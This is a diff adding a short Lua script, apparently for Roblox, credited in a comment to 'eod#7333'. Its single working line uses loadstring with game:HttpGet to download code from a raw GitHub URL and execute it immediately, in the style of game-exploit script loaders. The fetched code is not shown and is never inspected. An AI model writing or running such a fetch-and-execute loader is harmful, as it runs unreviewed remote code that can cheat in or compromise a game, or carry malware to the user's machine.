@@ -1,0 +1,6 @@
+--[[coded by eod#7333--]]
+
+
+
+
+loadstring(game:HttpGet('https://github.com/reallykaren/linkup/raw/main/linkv2'))();
